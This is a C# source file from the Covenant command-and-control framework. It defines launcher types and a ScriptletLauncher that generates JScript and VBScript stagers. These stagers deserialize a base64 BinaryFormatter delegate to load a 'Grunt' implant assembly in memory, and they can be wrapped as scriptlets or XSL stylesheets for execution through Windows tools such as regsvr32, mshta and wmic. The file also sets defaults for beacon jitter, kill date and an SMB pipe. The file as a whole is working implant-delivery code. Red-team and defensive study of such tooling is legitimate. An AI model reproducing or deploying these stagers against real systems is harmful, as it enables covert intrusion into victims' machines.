// Author: Ryan Cobb (@cobbr_io)
// Project: Covenant (https://github.com/cobbr/Covenant)
// License: GNU GPLv3

using System;
using System.Linq;
using System.Collections.Generic;
using System.ComponentModel.DataAnnotations;
using System.ComponentModel.DataAnnotations.Schema;

using Newtonsoft.Json;
using Microsoft.CodeAnalysis;

using Covenant.Core;
using Covenant.Models.Grunts;
using Covenant.Models.Listeners;

namespace Covenant.Models.Launchers
{
    public enum LauncherType
    {
        Wmic,
        Regsvr32,
        Mshta,
        Cscript,
        Wscript,
        PowerShell,
        Binary,
        MSBuild,
        InstallUtil,
        ShellCode
    }

    public class Launcher
    {
        [Key, DatabaseGenerated(DatabaseGeneratedOption.Identity)]
        public int Id { get; set; }
        public int ListenerId { get; set; }
        public int ImplantTemplateId { get; set; }

        public string Name { get; set; } = "";
        public string Description { get; set; } = "";
        public LauncherType Type { get; set; } = LauncherType.Binary;
        public Common.DotNetVersion DotNetVersion { get; set; } = Common.DotNetVersion.Net35;

        // .NET Core options
        public Compiler.RuntimeIdentifier RuntimeIdentifier { get; set; } = Compiler.RuntimeIdentifier.win_x64;

        // Http Options
        public bool ValidateCert { get; set; } = false;
        public bool UseCertPinning { get; set; } = false;

        // Smb Options
        public string SMBPipeName { get; set; } = "gruntsvc";

        public int Delay { get; set; } = 5;
        public int JitterPercent { get; set; } = 10;
        public int ConnectAttempts { get; set; } = 5000;
        public DateTime KillDate { get; set; } = DateTime.Now.AddDays(30);
        public string LauncherString { get; set; } = "";
        public string StagerCode { get; set; } = "";

        [NotMapped, JsonIgnore, System.Text.Json.Serialization.JsonIgnore]
        public string Base64ILByteString
        {
            get
            {
                try
                {
                    return Convert.ToBase64String(System.IO.File.ReadAllBytes(Common.CovenantLauncherDirectory + Name));
                }
                catch
                {
                    return "";
                }
            }
            set
            {
                System.IO.File.WriteAllBytes(Common.CovenantLauncherDirectory + Name, Convert.FromBase64String(value)); 
            }
        }

        public virtual string GetLauncher(string StagerCode, byte[] StagerAssembly, Grunt grunt, ImplantTemplate template) { return ""; }
        public virtual string GetHostedLauncher(Listener listener, HostedFile hostedFile) { return ""; }

        public OutputKind OutputKind { get; set; } = OutputKind.DynamicallyLinkedLibrary;
        public bool CompressStager { get; set; } = false;
    }

    public abstract class DiskLauncher : Launcher
    {
        public string DiskCode { get; set; }
    }

    public enum ScriptingLanguage
    {
        JScript,
        VBScript
    }

    public enum ScriptletType
    {
        Plain,
        Scriptlet,
        TaggedScript,
        Stylesheet
    }

    public abstract class ScriptletLauncher : DiskLauncher
    {
        public ScriptingLanguage ScriptLanguage { get; set; } = ScriptingLanguage.JScript;
        public string ProgId { get; set; } = Utilities.CreateSecureGuid().ToString();

        protected ScriptletType ScriptType { get; set; } = ScriptletType.Scriptlet;

        public override string GetLauncher(string StagerCode, byte[] StagerAssembly, Grunt grunt, ImplantTemplate template)
        {
            this.StagerCode = StagerCode;
            this.Base64ILByteString = Convert.ToBase64String(StagerAssembly);

            // Credit DotNetToJscript (tyranid - James Forshaw)
            byte[] serializedDelegate = Convert.FromBase64String(FrontBinaryFormattedDelegate).Concat(StagerAssembly).Concat(Convert.FromBase64String(EndBinaryFormattedDelegate)).ToArray();
            int ofs = serializedDelegate.Length % 3;
            if (ofs != 0)
            {
                int length = serializedDelegate.Length + (3 - ofs);
                Array.Resize(ref serializedDelegate, length);
            }
            string base64Delegate = Convert.ToBase64String(serializedDelegate);
            int lineLength = 80;
            List<String> splitString = new List<String>();
            for (int i = 0; i < base64Delegate.Length; i += lineLength)
            {
                splitString.Add(base64Delegate.Substring(i, Math.Min(lineLength, base64Delegate.Length - i)));
            }

            string language = "";
			string code = "";
            if (this.ScriptLanguage == ScriptingLanguage.JScript)
            {
				string DelegateBlock = String.Join("\"+\r\n\"", splitString.ToArray());
				code = JScriptTemplate.Replace(Environment.NewLine, "\r\n").Replace("{{REPLACE_GRUNT_IL_BYTE_STRING}}", DelegateBlock);
                language = "JScript";
            }
            else if(this.ScriptLanguage == ScriptingLanguage.VBScript)
            {
				string DelegateBlock = String.Join("\"\r\ns = s & \"", splitString.ToArray());
				code = VBScriptTemplate.Replace(Environment.NewLine, "\r\n").Replace("{{REPLACE_GRUNT_IL_BYTE_STRING}}", DelegateBlock);
                if (this.ScriptType == ScriptletType.Stylesheet)
                {
                    code = "<![CDATA[\r\n" + code + "\r\n]]>";
                }
                language = "VBScript";
            }

            if (this.ScriptType == ScriptletType.Plain)
            {
                this.DiskCode = code;
            }
            else if (this.ScriptType == ScriptletType.Scriptlet || this.ScriptType == ScriptletType.TaggedScript)
            {
				string TaggedScript = TaggedScriptTemplate.Replace(Environment.NewLine, "\r\n").Replace("{{REPLACE_SCRIPT_LANGUAGE}}", language);
				TaggedScript = TaggedScript.Replace("{{REPLACE_SCRIPT}}", code);
                if (this.ScriptType == ScriptletType.TaggedScript)
                {
                    this.DiskCode = TaggedScript;
                }
                else
                {
                    this.DiskCode = ScriptletCodeTemplate.Replace(Environment.NewLine, "\r\n").Replace("{{REPLACE_TAGGED_SCRIPT}}", TaggedScript).Replace("{{REPLACE_PROGID}}", this.ProgId);
                }
            }
            else if (this.ScriptType == ScriptletType.Stylesheet)
            {
				this.DiskCode = StylesheetCodeTemplate.Replace(Environment.NewLine, "\r\n").Replace("{{REPLACE_SCRIPT_LANGUAGE}}", language);
                this.DiskCode = DiskCode.Replace("{{REPLACE_SCRIPT}}", code);
            }

            if (this.DotNetVersion == Common.DotNetVersion.Net35)
            {
                this.DiskCode = this.DiskCode.Replace("{{REPLACE_VERSION_SETTER}}", "");
            }
            else if (this.DotNetVersion == Common.DotNetVersion.Net40)
            {
                this.DiskCode = this.DiskCode.Replace("{{REPLACE_VERSION_SETTER}}", JScriptNet40VersionSetter);
            }
            return GetLauncher();
        }

        protected abstract string GetLauncher();

        // Super ghetto - BinaryFormatter cannot seralize a Delegate in dotnet core. Instead, using a
        // raw, previously binary-formatted Delegate created in dotnet framework, and replacing the assembly bytes.
        protected static string FrontBinaryFormattedDelegate = "AAEAAAD/////AQAAAAAAAAAEAQAAACJTeXN0ZW0uRGVsZWdhdGVTZXJpYWxpemF0aW9uSG9sZGVyBAAAAAhEZWxlZ2F0ZQd0YXJnZXQwB21ldGhvZDAHbWV0aG9kMQMHAwMwU3lzdGVtLkRlbGVnYXRlU2VyaWFsaXphdGlvbkhvbGRlcitEZWxlZ2F0ZUVudHJ5Ai9TeXN0ZW0uUmVmbGVjdGlvbi5NZW1iZXJJbmZvU2VyaWFsaXphdGlvbkhvbGRlci9TeXN0ZW0uUmVmbGVjdGlvbi5NZW1iZXJJbmZvU2VyaWFsaXphdGlvbkhvbGRlcgkCAAAACQMAAAAJBAAAAAkFAAAABAIAAAAwU3lzdGVtLkRlbGVnYXRlU2VyaWFsaXphdGlvbkhvbGRlcitEZWxlZ2F0ZUVudHJ5BwAAAAR0eXBlCGFzc2VtYmx5BnRhcmdldBJ0YXJnZXRUeXBlQXNzZW1ibHkOdGFyZ2V0VHlwZU5hbWUKbWV0aG9kTmFtZQ1kZWxlZ2F0ZUVudHJ5AQECAQEBAzBTeXN0ZW0uRGVsZWdhdGVTZXJpYWxpemF0aW9uSG9sZGVyK0RlbGVnYXRlRW50cnkGBgAAANoBU3lzdGVtLkNvbnZlcnRlcmAyW1tTeXN0ZW0uQnl0ZVtdLCBtc2NvcmxpYiwgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODldLFtTeXN0ZW0uUmVmbGVjdGlvbi5Bc3NlbWJseSwgbXNjb3JsaWIsIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5XV0GBwAAAEttc2NvcmxpYiwgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODkGCAAAAAd0YXJnZXQwCQcAAAAGCgAAABpTeXN0ZW0uUmVmbGVjdGlvbi5Bc3NlbWJseQYLAAAABExvYWQJDAAAAA8DAAAAACQAAAI=";
        protected static string EndBinaryFormattedDelegate = "BAQAAAAvU3lzdGVtLlJlZmxlY3Rpb24uTWVtYmVySW5mb1NlcmlhbGl6YXRpb25Ib2xkZXIHAAAABE5hbWUMQXNzZW1ibHlOYW1lCUNsYXNzTmFtZQlTaWduYXR1cmUKU2lnbmF0dXJlMgpNZW1iZXJUeXBlEEdlbmVyaWNBcmd1bWVudHMBAQEBAQADCA1TeXN0ZW0uVHlwZVtdCQsAAAAJBwAAAAkKAAAABhAAAAAvU3lzdGVtLlJlZmxlY3Rpb24uQXNzZW1ibHkgTG9hZChCeXRlW10sIEJ5dGVbXSkGEQAAAD1TeXN0ZW0uUmVmbGVjdGlvbi5Bc3NlbWJseSBMb2FkKFN5c3RlbS5CeXRlW10sIFN5c3RlbS5CeXRlW10pCAAAAAoBBQAAAAQAAAAGEgAAAAhUb1N0cmluZwkHAAAABhQAAAAOU3lzdGVtLkNvbnZlcnQGFQAAACVTeXN0ZW0uU3RyaW5nIFRvU3RyaW5nKFN5c3RlbS5PYmplY3QpBhYAAAAlU3lzdGVtLlN0cmluZyBUb1N0cmluZyhTeXN0ZW0uT2JqZWN0KQgAAAAKAQwAAAACAAAABhcAAAAvU3lzdGVtLlJ1bnRpbWUuUmVtb3RpbmcuTWVzc2FnaW5nLkhlYWRlckhhbmRsZXIJBwAAAAoJBwAAAAkUAAAACRIAAAAKCw==";

        protected static String TaggedScriptTemplate =
@"<script language=""{{REPLACE_SCRIPT_LANGUAGE}}"">
{{REPLACE_SCRIPT}}
</script>";
        protected static String ScriptletCodeTemplate =
@"<scriptlet>
    <registration progid=""{{REPLACE_PROGID}}"">
        {{REPLACE_TAGGED_SCRIPT}}
    </registration>
</scriptlet>";
        private static String StylesheetCodeTemplate =
@"<stylesheet xmlns=""http://www.w3.org/1999/XSL/Transform"" xmlns:ms=""urn:schemas-microsoft-com:xslt"" xmlns:user=""blah"" version=""1.0"">
    <ms:script implements-prefix=""user"" language=""{{REPLACE_SCRIPT_LANGUAGE}}"">
{{REPLACE_SCRIPT}}
    </ms:script>
</stylesheet>";
        protected static String JScriptTemplate =
@"function toStream(bytes) {
    var encoder = new ActiveXObject(""System.Text.ASCIIEncoding"");
    var length = encoder.GetByteCount_2(bytes);
    var transformedBytes = encoder.GetBytes_4(bytes);
    var transform = new ActiveXObject(""System.Security.Cryptography.FromBase64Transform"");
    transformedBytes = transform.TransformFinalBlock(transformedBytes, 0, length);
    var stream = new ActiveXObject(""System.IO.MemoryStream"");
    stream.Write(transformedBytes, 0, (length / 4) * 3);
    stream.Position = 0;
    return stream;
}

{{REPLACE_VERSION_SETTER}}
var assembly_str = ""{{REPLACE_GRUNT_IL_BYTE_STRING}}"";
var stream = toStream(assembly_str);
var formatter = new ActiveXObject('System.Runtime.Serialization.Formatters.Binary.BinaryFormatter');
var array = new ActiveXObject('System.Collections.ArrayList');
var delegate = formatter.Deserialize_2(stream);
array.Add(undefined);
var o = delegate.DynamicInvoke(array.ToArray()).CreateInstance('Grunt.GruntStager');";
        protected static string JScriptNet40VersionSetter =
@"var s = new ActiveXObject('Wscript.Shell');
s.Environment('Process')('COMPLUS_Version') = 'v4.0.30319';";

        protected static String VBScriptTemplate =
@"Function Base64ToStream(bytes)
  Dim encoder, length, transform, stream
  Set encoder = CreateObject(""System.Text.ASCIIEncoding"")
  length = encoder.GetByteCount_2(bytes)
  Set transform = CreateObject(""System.Security.Cryptography.FromBase64Transform"")
  Set stream = CreateObject(""System.IO.MemoryStream"")
  stream.Write transform.TransformFinalBlock(encoder.GetBytes_4(bytes), 0, length), 0, ((length / 4) * 3)
  stream.Position = 0
  Set Base64ToStream = stream
End Function

{{REPLACE_VERSION_SETTER}}
Dim s
s = ""{{REPLACE_GRUNT_IL_BYTE_STRING}}""

Dim formatter, array, delegate, output
Set formatter = CreateObject(""System.Runtime.Serialization.Formatters.Binary.BinaryFormatter"")
Set array = CreateObject(""System.Collections.ArrayList"")
array.Add Empty

Set delegate = formatter.Deserialize_2(Base64ToStream(s))
Set output = delegate.DynamicInvoke(array.ToArray()).CreateInstance(""Grunt.GruntStager"")";
        protected static String VBScriptNet40VersionSetter =
@"Dim shell, ver
  Set shell = CreateObject(""WScript.Shell"")
  ver = ""v4.0.30319""
  shell.Environment(""Process"").Item(""COMPLUS_Version"") = ver";
    }
}
